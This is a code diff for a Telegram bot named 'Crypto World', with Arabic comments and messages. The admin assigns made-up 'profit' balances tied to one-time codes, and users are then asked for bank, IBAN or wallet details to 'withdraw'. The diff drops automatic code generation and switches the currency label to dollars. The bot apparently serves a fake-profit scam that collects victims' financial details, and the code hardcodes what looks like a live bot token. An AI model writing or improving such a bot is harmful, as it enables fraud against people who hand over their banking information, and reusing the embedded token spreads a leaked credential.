@@ -1,7 +1,5 @@
 import logging
 import os
-import random
-import string
 import asyncio
 from telegram import InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardRemove, Update
 from telegram.ext import (
@@ -13,7 +11,7 @@ from telegram.ext import (
     filters,
 )
 
-# التوكن المعتمد للبوت الجديد
+# التوكن المعتمد للبوت
 TOKEN = "9014957370:AAHEFAt-9tIbs2qJvUPA-H4QBB2mn4f6v4M"
 ADMIN_ID = 7004113433  # معرف الأدمن الخاص بك
 SUPPORT_HANDLE = "@AbuAbdulAlziz"
@@ -34,11 +32,6 @@ custom_profits = {
     "189415": {"amount": "1500", "assigned_user_id": None}
 }
 USED_CODES = set()
-
-def generate_new_code() -> str:
-    """توليد معرف عملية جديد وعشوائي وآمن يبدأ بـ 354"""
-    chars = string.digits
-    return "354" + "".join(random.choices(chars, k=6))
 
 # تقدير عمر الحساب بناءً على الـ ID
 def estimate_account_age(user_id: int) -> str:
@@ -81,7 +74,7 @@ async def set_profit(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
         f"✅ **تم تخصيص الأرباح ورقم التحقق بنجاح!**\n\n"
         f"• معرف المستخدم: `{target_user_id}`\n"
-        f"• الرصيد/الأرباح: `{amount} ريال`\n"
+        f"• الرصيد/الأرباح: `{amount} دولار`\n"
         f"• رقم التحقق الخاص به: `{code}`\n\n"
         "🔒 هذا الرقم مرتبط به وحده ولا يمكن لأي شخص آخر استخدامه.",
         parse_mode="Markdown"
@@ -97,7 +90,7 @@ async def admin_get_codes(update: Update, context: ContextTypes.DEFAULT_TYPE):
         parse_mode="Markdown"
     )
 
-# أمر /start الترحيبي بالاسم الجديد (عالم الكريبتو | Crypto World)
+# أمر /start الترحيبي
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     user_id = user.id
@@ -204,8 +197,8 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         reply_markup = InlineKeyboardMarkup(keyboard)
 
         await msg.reply_text(
-            "💳 **إدخال الحساب البنكي:**\n\n"
-            "الرجاء إرسال تفاصيل حسابك البنكي أو رقم الآيبان (IBAN) في رسالة هنا ليتم ربطه بطلب السحب:",
+            "💳 **إدخال الحساب البنكي / محفظة الاستلام:**\n\n"
+            "الرجاء إرسال تفاصيل حسابك أو محفظتك في رسالة هنا ليتم ربطها بطلب السحب:",
             reply_markup=reply_markup,
             parse_mode="Markdown"
         )
@@ -222,7 +215,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
         return
 
-    # الحالة الثانية: التحقق من رقم التحقق المدخل من الزبون
+    # الحالة الثانية: التحقق من رقم التحقق المدخل من الزبون (بدون توليد رمز جديد تلقائياً)
     if current_state == "waiting_for_code" or text in custom_profits:
         if text in custom_profits:
             code_info = custom_profits[text]
@@ -234,22 +227,17 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
             profit_amount = code_info["amount"]
 
-            # حرق الكود واستبعاده فوراً
+            # حرق الكود واستبعاده فوراً دون توليد رمز جديد
             del custom_profits[text]
             USED_CODES.add(text)
             user_states[user_id] = "viewing_balance"
-            
-            # توليد رقم تحقق جديد للأدمن
-            auto_new_code = generate_new_code()
-            custom_profits[auto_new_code] = {"amount": "2000", "assigned_user_id": None}
 
             await context.bot.send_message(
                 chat_id=ADMIN_ID,
                 text=(
-                    "🔑 **تم استهلاك رقم تحقق وإصدار رقم جديد!**\n\n"
+                    "🔑 **تم استهلاك رقم تحقق بنجاح!**\n\n"
                     f"• الرقم المستهلك (المحروق): `{text}`\n"
-                    f"• بواسطة المستخدم: `{user_id}` ({username})\n\n"
-                    f"🆕 **رقم التحقق الجديد المتجدد لتسليمه للزبون القادم:**\n`{auto_new_code}`"
+                    f"• بواسطة المستخدم: `{user_id}` ({username})"
                 ),
                 parse_mode="Markdown"
             )
@@ -403,7 +391,7 @@ def main():
     app.add_handler(MessageHandler(filters.PHOTO, handle_photo))
     app.add_handler(CallbackQueryHandler(button_handler))
 
-    print("🤖 بوت (عالم الكريبتو | Crypto World) يعمل الآن بالتوكن الجديد والهوية الجديدة بكفاءة عالية...")
+    print("🤖 بوت (عالم الكريبتو | Crypto World) يعمل الآن بدون توليد رموز تلقائية...")
     app.run_polling()
 
 if __name__ == "__main__":
